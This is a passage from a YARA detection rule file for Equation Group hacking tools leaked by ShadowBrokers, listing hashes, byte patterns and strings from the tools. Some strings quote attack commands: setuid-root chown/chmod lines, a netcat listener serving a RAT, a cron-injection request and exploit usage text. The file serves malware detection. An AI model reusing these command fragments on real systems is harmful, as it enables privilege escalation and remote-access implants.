$x3 = "[-] failed to spawn shell: %s" fullword ascii
$x4 = "-s shell           Use shell instead of %s" fullword ascii
condition:
1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_msgks_mskgu {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "7b4986aee8f5c4dca255431902907b36408f528f6c0f7d7fa21f079fa0a42e09"
hash2 = "ef906b8a8ad9dca7407e0a467b32d7f7cf32814210964be2bfb5b0e6d2ca1998"
strings:
$op1 = { f4 65 c6 45 f5 6c c6 45 f6 33 c6 45 f7 32 c6 45 }
$op2 = { 36 c6 45 e6 34 c6 45 e7 50 c6 45 e8 72 c6 45 e9 }
$op3 = { c6 45 e8 65 c6 45 e9 70 c6 45 ea 74 c6 45 eb 5f }
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_gr {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "d3cd725affd31fa7f0e2595f4d76b09629918612ef0d0307bb85ade1c3985262"
strings:
$s1 = "if [ -f /tmp/tmpwatch ] ; then" fullword ascii
$s2 = "echo \"bailing. try a different name\"" fullword ascii
condition:
( filesize < 1KB and all of them )
}
rule SSC_EquationGroup_estesfox {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file estesfox"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "33530cae130ee9d9deeee60df9292c00242c0fe6f7b8eedef8ed09881b7e1d5a"
strings:
$x1 = "chown root:root x;chmod 4777 x`' /tmp/logwatch.$2/cron" fullword ascii
condition:
all of them
}
rule SSC_EquationGroup_promptkill {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file promptkill"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "b448204503849926be249a9bafbfc1e36ef16421c5d3cfac5dac91f35eeaa52d"
strings:
$x1 = "exec(\"xterm $xargs -e /current/tmp/promptkill.kid.$tag $pid\");" fullword ascii
$x2 = "$xargs=\"-title \\\"Kill process $pid?\\\" -name \\\"Kill process $pid?\\\" -bg white -fg red -geometry 202x19+0+0\" ;" fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_KisuComms_Target_2000 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "94eea1bad534a1dc20620919de8046c9966be3dd353a50f25b719c3662f22135"
strings:
$s1 = "363<3S3c3l3q3v3{3" fullword ascii
$s2 = "3!3%3)3-3135393@5" fullword ascii
/* Recommendation - verify the opcodes on Binarly : http://www.binar.ly */
/* Test each of them in the search field & reduce length until it generates matches */
$op0 = { eb 03 89 46 54 47 83 ff 1a 0f 8c 40 ff ff ff 8b }
$op1 = { 8b 46 04 85 c0 74 0f 50 e8 34 fb ff ff 83 66 04 }
$op2 = { c6 45 fc 02 8d 8d 44 ff ff ff e8 d2 2f 00 00 eb }
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and ( all of ($s*) or all of ($op*) ) )
}
rule SSC_EquationGroup_Toolset_Apr17_Explodingcantouch_1_2_1 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "0cdde7472b077610d0068aa7e9035da89fe5d435549749707cae24495c8d8444"
strings:
$x1 = "[-] Connection closed by remote host (TCP Ack/Fin)" fullword ascii
$s2 = "[!]Warning: Error on first request - path size may actually be larger than indicated." fullword ascii
$s4 = "<http://%s/%s> (Not <locktoken:write1>) <http://%s/>" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}
rule SSC_EquationGroup__magicjack_v1_1_0_0_client {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files magicjack_v1.1.0.0_client-1.1.0.0.py"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "63292a2353275a3bae012717bb500d5169cd024064a1ce8355ecb4e9bfcdfdd1"
strings:
$s1 = "temp = ((left >> 1) ^ right) & 0x55555555" fullword ascii
$s2 = "right ^= (temp <<  16) & 0xffffffff" fullword ascii
$s3 = "tempresult = \"\"" fullword ascii
$s4 = "num = self.bytes2long(data)" fullword ascii
condition:
( uint16(0) == 0x2123 and filesize < 80KB and 3 of them ) or ( all of them )
}
rule SSC_EquationGroup_jparsescan {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file jparsescan"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "8c248eec0af04300f3ba0188fe757850d283de84cf42109638c1c1280c822984"
strings:
$s1 = "Usage:  $prog [-f directory] -p prognum [-V ver] [-t proto] -i IPadr" fullword ascii
$s2 = "$gotsunos = ($line =~ /program version netid     address             service         owner/ );" fullword ascii
condition:
( filesize < 40KB and 1 of them )
}
rule SSC_EquationGroup_curseyo_win2k_v_1_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "5dc77614764b23a38610fdd8abe5b2274222f206889e4b0974a3fea569055ed6"
strings:
$s1 = "0123456789abcdefABCEDF:" fullword ascii
$op0 = { c6 06 5b 8b bd 70 ff ff ff 8b 9d 64 ff ff ff 0f } /* Opcode */
$op1 = { 55 b8 ff ff ff ff 89 e5 83 ec 28 89 7d fc 8b 7d } /* Opcode */
$op2 = { ff 05 10 64 41 00 89 34 24 e8 df 1e 00 00 e9 31 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 200KB and all of them )
}
rule SSC_EquationGroup_cmsex {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file cmsex"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "2d8ae842e7b16172599f061b5b1f223386684a7482e87feeb47a38a3f011b810"
strings:
$x1 = "Usage: %s -i <ip_addr/hostname> -c <command> -T <target_type> (-u <port> | -t <port>) " fullword ascii
$x2 = "-i target ip address / hostname " fullword ascii
$x3 = "Note: Choosing the correct target type is a bit of guesswork." fullword ascii
$x4 = "Solaris rpc.cmsd remote root exploit" fullword ascii
$x5 = "If one choice fails, you may want to try another." fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and 1 of ($x*) ) or ( 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Rpctouch_2_1_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "7fe4c3cedfc98a3e994ca60579f91b8b88bf5ae8cf669baa0928508642c5a887"
strings:
$x1 = "[*] Failed to detect OS / Service Pack on %s:%d" fullword ascii
$x2 = "[*] SMB String: %s (%s)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 80KB and 1 of them )
}
rule SSC_EquationGroup__pclean_v2_1_1_pclean_v2_1_1_4 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- from files pclean.v2.1.1.0-linux-i386, pclean.v2.1.1.0-linux-x86_64"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
super_rule = 1
hash1 = "cdb5b1173e6eb32b5ea494c38764b9975ddfe83aa09ba0634c4bafa41d844c97"
hash2 = "ab7f26faed8bc2341d0517d9cb2bbf41795f753cd21340887fc2803dc1b9a1dd"
strings:
$s1 = "-c cmd_name:     strncmp() search for 1st %d chars of commands that " fullword ascii
$s2 = "e.g.: -n 1-1024,1080,6666,31337 " fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_GrDo_FileScanner_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "8d2e43567e1360714c4271b75c21a940f6b26a789aa0fce30c6478ae4ac587e4"
strings:
$s1 = "system32\\winsrv.dll" fullword wide
$s2 = "raw_open CreateFile error" fullword ascii
$s3 = "\\dllcache\\" fullword wide
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Educatedscholar_1_0_0 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "4cce9e39c376f67c16df3bcd69efd9b7472c3b478e2e5ef347e1410f1105c38d"
strings:
$x1 = "[+] Shellcode Callback %s:%d" fullword ascii
$x2 = "[+] Exploiting Target" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 150KB and 1 of them )
}
rule SSC_EquationGroup_slugger2 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file slugger2"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "a6a9ab66d73e4b443a80a69ef55a64da7f0af08dfaa7e17eb19c327301a70bdf"
strings:
$x1 = "usage: %s hostip port cmd [printer_name]" fullword ascii
$x2 = "command must be less than 61 chars" fullword ascii
$s1 = "__rw_read_waiting" fullword ascii
$s2 = "completed.1" fullword ascii
$s3 = "__mutexkind" fullword ascii
$s4 = "__rw_pshared" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 50KB and ( 4 of them and 1 of ($x*) ) ) or ( all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_scanner {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "f180bdb247687ea9f1b58aded225d5c80a13327422cd1e0515ea891166372c53"
strings:
$x1 = "+daemon_version,system,processor,refid,clock" fullword ascii
$x2 = "Usage: %s typeofscan IP_address" fullword ascii
$x3 = "# scanning ip  %d.%d.%d.%d" fullword ascii
$x4 = "Welcome to the network scanning tool" fullword ascii
$x5 = "***** %s ***** (length %d)" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 90KB and 1 of them )
}
rule SSC_EquationGroup_cursehappy_win2k_v_6_1_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "eb669afd246a7ac4de79724abcce5bda38117b3138908b90cac58936520ea632"
strings:
$op1 = { e8 24 2c 01 00 85 c0 89 c6 ba ff ff ff ff 74 d6 } /* Opcode */
$op2 = { 89 4c 24 04 89 34 24 89 44 24 08 e8 ce 49 ff ff } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DiBa_Target {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "ffff3526ed0d550108e97284523566392af8523bbddb5f212df12ef61eaad3e6"
strings:
$op1 = { 41 5a 41 59 41 58 5f 5e 5d 5a 59 5b 58 48 83 c4 }
$op2 = { f9 48 03 fa 48 33 c0 8a 01 49 03 c1 49 f7 e0 88 }
$op3 = { 01 41 f6 e0 49 03 c1 88 01 48 33 }
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_svctouch {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "96b6a3c4f53f9e7047aa99fd949154745e05dc2fd2eb21ef6f0f9b95234d516b"
strings:
$s1 = "Causes: Firewall,Machine down,DCOM disabled\\not supported,etc." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 10KB and 1 of them )
}
rule SSC_EquationGroup_packrat {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file packrat"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "d3e067879c51947d715fc2cf0d8d91c897fe9f50cae6784739b5c17e8a8559cf"
strings:
$x2 = "Use this on target to get your RAT:" fullword ascii
$x3 = "$ratremotename && " fullword ascii
$x5 = "$command = \"$nc$bindto -vv -l -p $port < ${ratremotename}\" ;" fullword ascii
condition:
( filesize < 70KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_DmGz_Target_2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "55ac29b9a67e0324044dafaba27a7f01ca3d8e4d8e020259025195abe42aa904"
strings:
$s1 = "\\\\.\\%ls" fullword ascii
$op0 = { e8 ce 34 00 00 b8 02 00 00 f0 e9 26 02 00 00 48 }
$op1 = { 8b 4d 28 e8 02 05 00 00 89 45 34 eb 07 c7 45 34 }
$op2 = { e8 c2 34 00 00 90 48 8d 8c 24 00 01 00 00 e8 a4 }
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_pwd_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "ee72ac76d82dfec51c8fbcfb5fc99a0a45849a4565177e01d8d23a358e52c542"
strings:
$s1 = "7\"7(7/7>7O7]7o7w7" fullword ascii
$op1 = { 40 50 89 44 24 18 FF 15 34 20 00 }
condition:
( uint16(0) == 0x5a4d and filesize < 20KB and 1 of them )
}
rule SSC_EquationGroup_exze {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file exze"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "1af6dde6d956db26c8072bf5ff26759f1a7fa792dd1c3498ba1af06426664876"
strings:
$s1 = "shellFile" fullword ascii
$s2 = "completed.1" fullword ascii
$s3 = "zeke_remove" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 80KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__ecwi_ESKE_EVFR_RPC2_2 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "c4152f65e45ff327dade50f1ac3d3b876572a66c1ce03014f2877cea715d9afd"
hash2 = "9d16d97a6c964e0658b6cd494b0bbf70674bf37578e2ff32c4779a7936e40556"
hash3 = "c5e119ff7b47333f415aea1d2a43cb6cb322f8518562cfb9b90399cac95ac674"
hash4 = "5c0896dbafc5d8cc19b1bc7924420b20ed5999ac5bee2cb5a91aada0ea01e337"
strings:
$s1 = "Target is share name" fullword ascii
$s2 = "Could not make UdpNetbios header -- bailing" fullword ascii
$s3 = "Request non-NT session key" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 2000KB and all of them )
}
rule SSC_EquationGroup_tmpwatch {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "65ed8066a3a240ee2e7556da74933a9b25c5109ffad893c21a626ea1b686d7c1"
strings:
$s1 = "chown root:root /tmp/.scsi/dev/bin/gsh" fullword ascii
$s2 = "chmod 4777 /tmp/.scsi/dev/bin/gsh" fullword ascii
condition:
( filesize < 1KB and 1 of them )
}
rule SSC_EquationGroup_watcher_solaris_i386_v_3_3_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "395ec2531970950ffafde234dded0cce0c95f1f9a22763d1d04caa060a5222bb"
strings:
$s1 = "getexecname" fullword ascii
$s2 = "invalid option `" fullword ascii
$s6 = "__fpstart" fullword ascii
$s12 = "GHFIJKLMNOPQRSTUVXW" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 700KB and all of them )
}
rule SSC_EquationGroup_cursetingle_2_0_1_2_mswin32_v_2_0_1 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "614bf159b956f20d66cedf25af7503b41e91841c75707af0cdf4495084092a61"
strings:
$s1 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
$s2 = "0123456789abcdefABCEDF:" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_gr_dev_bin_post {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "c1546155efa95dbc4e3cc95299a3968fc075f89d33164e78b00b76c7d08a0591"
strings:
$x1 = "op=cron&action=once&frame=cronOnceFrame&cronK=cronV&cronCommand=%2Ftmp%2Ftmpwatch&time=12%3A12+01%2F28%2F2005" ascii
condition:
( filesize < 1KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17__AddResource {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "e83e4648875d4c4aa8bc6f3c150c12bad45d066e2116087cdf78a4a4efbab6f0"
hash2 = "5a04d65a61ef04f5a1cbc29398c767eada367459dc09c54c3f4e35015c71ccff"
strings:
$s1 = "%s cm 10 2000 \"c:\\MY DIR\\myapp.exe\" c:\\MyResourceData.dat" fullword ascii
$s2 = "<PE path> - the path to the PE binary to which to add the resource." fullword ascii
$s3 = "Unable to get path for target binary." fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 2 of them )
}
rule SSC_EquationGroup_Toolset_Apr17__LSADUMP_Lp_ModifyPrivilege_Lp_PacketScan_Lp_put_Lp_RemoteExecute_Lp_Windows_Lp_wmi_Lp_9 {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
super_rule = 1
hash1 = "c7bf4c012293e7de56d86f4f5b4eeb6c1c5263568cc4d9863a286a86b5daf194"
hash2 = "d92928a867a685274b0a74ec55c0b83690fca989699310179e184e2787d47f48"
hash3 = "2d963529e6db733c5b74db1894d75493507e6e40da0de2f33e301959b50f3d32"
hash4 = "e9f6a84899c9a042edbbff391ca076169da1a6f6dfb61b927942fe4be3327749"
hash5 = "d989d610b032c72252a2df284d0b53f63f382e305de2a18b453a0510ab6246a3"
hash6 = "23d98bca1f6e2f6989d53c2f2adff996ede2c961ea189744f8ae65621003b8b1"
hash7 = "d7ae24816fda190feda6a60639cf3716ea00fb63a4bd1069b8ce52d10ad8bc7f"
strings:
$x1 = "Injection Lib -  " wide
$x2 = "LSADUMP - - ERROR" wide
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_regprobe {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "99a42440d4cf1186aad1fd09072bd1265e7c6ebbc8bcafc28340b4fe371767de"
strings:
$x1 = "Usage: %s targetIP protocolSequence portNo [redirectorIP] [CLSID]" fullword ascii
$x2 = "key does not exist or pinging w2k system" fullword ascii
$x3 = "RpcProxy=255.255.255.255:65536" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_ewok {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ewok"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "567da502d7709b7814ede9c7954ccc13d67fc573f3011db04cf212f8e8a95d72"
strings:
$x1 = "Example: ewok -t target public" fullword ascii
$x2 = "Usage:  cleaner host community fake_prog" fullword ascii
$x3 = "-g  - Subset of -m that Green Spirit hits " fullword ascii
$x4 = "--- ewok version" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 80KB and 1 of them )
}
rule SSC_EquationGroup_linux_exactchange {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
super_rule = 1
hash1 = "dfecaf5b85309de637b84a686dd5d2fca9c429e8285b7147ae4213c1f49d39e6"
hash2 = "6ef6b7ec1f1271503957cf10bb6b1bfcedb872d2de3649f225cf1d22da658bec"
hash3 = "39d4f83c7e64f5b89df9851bdba917cf73a3449920a6925b6cd379f2fdec2a8b"
hash4 = "15e12c1c27304e4a68a268e392be4972f7c6edf3d4d387e5b7d2ed77a5b43c2c"
strings:
$x1 = "[+] looking for vulnerable socket" fullword ascii
$x2 = "can't use 32-bit exploit on 64-bit target" fullword ascii
$x3 = "[+] %s socket ready, exploiting..." fullword ascii
$x4 = "[!] nothing looks vulnerable, trying everything" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 2000KB and 1 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_lp_mstcp {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "2ab1e1d23021d887759750a0c053522e9149b7445f840936bbc7e703f8700abd"
strings:
$s1 = "\\Registry\\User\\CurrentUser\\" fullword wide
$s2 = "_PacketNDISRequestComplete@12\"" fullword ascii
$s3 = "_LDNdis5RegDeleteKeys@4" fullword ascii
$op1 = { 89 7e 04 75 06 66 21 46 02 eb }
$op2 = { fc 74 1b 8b 49 04 0f b7 d3 66 83 }
$op3 = { aa 0f b7 45 fc 8b 52 04 8d 4e }
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and ( all of ($s*) or all of ($op*) ) )
}
rule SSC_EquationGroup_Toolset_Apr17_PC_Level3_Gen {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "c7dd49b98f399072c2619758455e8b11c6ee4694bb46b2b423fa89f39b185a97"
hash2 = "f6b723ef985dfc23202870f56452581a08ecbce85daf8dc7db4491adaa4f6e8f"
strings:
$s1 = "S-%u-%u" fullword ascii
$s2 = "Copyright (C) Microsoft" fullword wide
$op1 = { 24 39 65 c6 44 24 3a 6c c6 44 24 3b 65 c6 44 24 }
$op2 = { 44 24 4e 41 88 5c 24 4f ff }
$op3 = { 44 24 3f 6e c6 44 24 40 45 c6 44 24 41 }
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )
}
rule SSC_EquationGroup_libXmexploit2 {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file libXmexploit2.8"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "d7ed0234d074266cb37dd6a6a60119adb7d75cc6cc3b38654c8951b643944796"
strings:
$s1 = "Usage: ./exp command display_to_return_to" fullword ascii
$s2 = "sizeof shellcode = %d" fullword ascii
$s3 = "Execve failed!" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 40KB and 1 of them )
}
rule SSC_EquationGroup_curseflower_mswin32_v_1_0_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "fdc452629ff7befe02adea3a135c3744d8585af890a4301b2a10a817e48c5cbf"
strings:
$s1 = "<pVt,<et(<st$<ct$<nt" fullword ascii
$op1 = { 6a 04 83 c0 08 6a 01 50 e8 10 34 00 00 83 c4 10 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 300KB and all of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Oracle_Implant {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "8e9be4960c62ed7f210ce08f291e410ce0929cd3a86fe70315d7222e3df4587e"
strings:
$op0 = { fe ff ff ff 48 89 9c 24 80 21 00 00 48 89 ac 24 }
$op1 = { e9 34 11 00 00 b8 3e 01 00 00 e9 2a 11 00 00 b8 }
$op2 = { 48 8b ca e8 bf 84 00 00 4c 8b e0 8d 34 00 44 8d }
condition:
( uint16(0) == 0x5a4d and filesize < 500KB and all of them )
}
rule SSC_EquationGroup_store_linux_i386_v_3_3_0 {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "abc27fda9a0921d7cf2863c29768af15fdfe47a0b3e7a131ef7e5cc057576fbc"
strings:
$s1 = "[-] Failed to map file: %s" fullword ascii
$s2 = "[-] can not NULL terminate input data" fullword ascii
$s3 = "[!] Name has size of 0!" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 60KB and all of them )
}
rule SSC_EquationGroup_ebbshave {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ebbshave.v5"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "eb5e0053299e087c87c2d5c6f90531cc1946019c85a43a2998c7b66a6f19ca4b"
strings:
$s1 = "executing ./ebbnew_linux -r %s -v %s -A %s %s -t %s -p %s" fullword ascii
$s2 = "./ebbnew_linux.wrapper -o 2 -v 2 -t 192.168.10.4 -p 32772" fullword ascii
$s3 = "version 1 - Start with option #18 first, if it fails then try this option" fullword ascii
$s4 = "%s is a wrapper program for ebbnew_linux exploit for Sparc Solaris RPC services" fullword ascii
condition:
( uint16(0) == 0x457f and filesize < 20KB and 1 of them ) or ( 2 of them )
}
rule SSC_EquationGroup_cursewham_curserazor_cursezinger_curseroot_win2k {
meta:
description = "Equation Group hack tool set"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-09"
hash1 = "aff27115ac705859871ab1bf14137322d1722f63705d6aeada43d18966843225"
hash2 = "7a25e26950bac51ca8d37cec945eb9c38a55fa9a53bc96da53b74378fb10b67e"
strings:
$s1 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/%s,%s" fullword ascii
$s3 = ",%02d%03d" fullword ascii
$s4 = "[%.2u%.2u%.2u%.2u%.2u%.2u]" fullword ascii
$op1 = { 7d ec 8d 74 3f 01 0f af f7 c1 c6 05 } /* Opcode */
$op2 = { 29 f1 89 fb d3 eb 89 f1 d3 e7 } /* Opcode */
$op3 = { 7d e4 8d 5c 3f 01 0f af df c1 c3 05 } /* Opcode */
condition:
( uint16(0) == 0x5a4d and filesize < 400KB and 3 of them )
}
rule SSC_EquationGroup_Toolset_Apr17_Easypi_Explodingcan {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
hash1 = "dc1ddad7e8801b5e37748ec40531a105ba359654ffe8bdb069bd29fb0b5afd94"
hash2 = "97af543cf1fb59d21ba5ec6cb2f88c8c79c835f19c8f659057d2f58c321a0ad4"
strings:
$x1 = "[-] %s - Target might not be in a usable state." fullword ascii
$x2 = "[*] Exploiting Target" fullword ascii
$x3 = "[-] Encoding Exploit Payload failed!" fullword ascii
condition:
( uint16(0) == 0x5a4d and filesize < 100KB and 1 of them )
}
rule SSC_EquationGroup_ys {
meta:
description = "Equation Group hack tool leaked by ShadowBrokers- file ys.auto"
author = "Florian Roth"
reference = "https://medium.com/@shadowbrokerss/dont-forget-your-base-867d304a94b1"
date = "2017-04-08"
hash1 = "a6387307d64778f8d9cfc60382fdcf0627cde886e952b8d73cc61755ed9fde15"
strings:
$x1 = "EXPLOIT_SCRIPME=\"$EXPLOIT_SCRIPME\"" fullword ascii
$x3 = "DEFTARGET=`head /current/etc/opscript.txt 2>/dev/null | grepip 2>/dev/null | head -1`" fullword ascii
$x4 = "FATAL ERROR: -x port and -n port MUST NOT BE THE SAME." fullword ascii
condition:
filesize < 250KB and 1 of them
}
rule SSC_EquationGroup_Toolset_Apr17_FullThreadDump {
meta:
description = "Detects EquationGroup Tool - April Leak"
author = "Florian Roth"
reference = "https://steemit.com/shadowbrokers/@theshadowbrokers/lost-in-translation"
date = "2017-04-15"
